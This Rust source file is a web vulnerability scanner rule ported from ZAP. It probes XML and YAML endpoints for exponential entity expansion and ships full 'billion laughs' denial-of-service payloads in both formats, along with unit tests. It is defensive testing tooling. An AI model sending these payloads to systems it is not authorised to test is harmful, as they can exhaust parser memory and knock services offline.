//! Ported from ZAP ExponentialEntityExpansionScanRule (ascanrules, Apache License 2.0).

use std::time::Duration;

use super::common::{no_response, with_body};
use crate::error::Error;
use crate::scan::active::{ActiveRule, BoxFuture, Cx, RuleScope};
use crate::scan::{AlertDef, Confidence, Risk};

static ALERT: AlertDef = AlertDef {
    alert_ref: "40044",
    name: "Exponential Entity Expansion (Billion Laughs Attack)",
    risk: Risk::Medium,
    confidence: Confidence::Low,
    cwe: 776,
    wasc: 44,
    description: "An exponential entity expansion, or \"billion laughs\" attack is a type of denial-of-service (DoS) \
        attack. It is aimed at parsers of markup languages like XML or YAML that allow macro expansions.",
    solution: "Defenses against this kind of attack include capping the memory allocated in an individual parser if \
        loss of the document is acceptable, or treating entities symbolically and expanding them lazily only when \
        (and to the extent) their content is to be used.",
    references: &[
        "https://en.wikipedia.org/wiki/Billion_laughs_attack",
        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        "https://cwe.mitre.org/data/definitions/776.html",
    ],
    tags: &[
        "API_2023_API10",
        "OWASP_2025_A05",
        "OWASP_2025_A06",
        "OWASP_2025_A10",
        "OWASP_2021_A04",
        "WSTG-v42-BUSL-09",
    ],
};

static ALERTS: [&AlertDef; 1] = [&ALERT];

const MIN_TIME_ELAPSED: Duration = Duration::from_secs(10);

const XML_PAYLOAD: &str = "<?xml version=\"1.0\"?>\n\
<!DOCTYPE lolz [\n \
<!ENTITY lol \"lol\">\n \
<!ELEMENT lolz (#PCDATA)>\n \
<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n \
<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n \
<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n \
<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n \
<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n \
<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n \
<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n \
<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n \
<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n\
]>\n\
<lolz>&lol9;</lolz>";

const YAML_PAYLOAD: &str = "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n\
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\n\
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\n\
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n\
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\n\
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\n\
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\n\
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\n\
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]";

/// The payload for the base request's Content-Type, if it is XML or YAML.
fn payload_for(content_type: &str) -> Option<&'static str> {
    let ct = content_type.to_ascii_lowercase();
    if ct.contains("xml") {
        Some(XML_PAYLOAD)
    } else if ct.contains("yml") || ct.contains("yaml") {
        Some(YAML_PAYLOAD)
    } else {
        None
    }
}

fn other_info(elapsed: Duration) -> String {
    format!("The attack HTTP request received a response after {} seconds.", elapsed.as_secs())
}

pub struct EntityExpansion;

impl ActiveRule for EntityExpansion {
    fn id(&self) -> u32 {
        40044
    }

    fn name(&self) -> &'static str {
        "Exponential Entity Expansion (Billion Laughs Attack)"
    }

    fn alerts(&self) -> &'static [&'static AlertDef] {
        &ALERTS
    }

    fn scope(&self) -> RuleScope {
        RuleScope::Page
    }

    fn scan<'a>(&'a self, cx: &'a Cx) -> BoxFuture<'a> {
        Box::pin(async move {
            let Some(attack) = payload_for(cx.base().req_header("content-type").unwrap_or("")) else { return };
            if cx.stopped() {
                return;
            }
            let request = with_body(cx.base_request().to_vec(), attack.as_bytes());
            let resp = match cx.send_following(request.clone()).await {
                Ok(resp) if resp.duration > MIN_TIME_ELAPSED => resp,
                Ok(_) => return,
                Err(Error::Timeout(d)) => no_response(cx, request, d),
                Err(_) => return,
            };
            let finding = ALERT.raise("", "").attack(attack).other_info(other_info(resp.duration));
            cx.report(finding, &resp);
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads() {
        assert_eq!(payload_for("application/xml; charset=utf-8"), Some(XML_PAYLOAD));
        assert_eq!(payload_for("text/XML"), Some(XML_PAYLOAD));
        assert_eq!(payload_for("application/x-yaml"), Some(YAML_PAYLOAD));
        assert_eq!(payload_for("application/json"), None);
        assert!(XML_PAYLOAD.contains("\n <!ENTITY lol9 "));
        assert!(XML_PAYLOAD.ends_with("]>\n<lolz>&lol9;</lolz>"));
        assert_eq!(YAML_PAYLOAD.lines().count(), 9);
        assert_eq!(
            other_info(Duration::from_millis(12_900)),
            "The attack HTTP request received a response after 12 seconds."
        );
    }
}
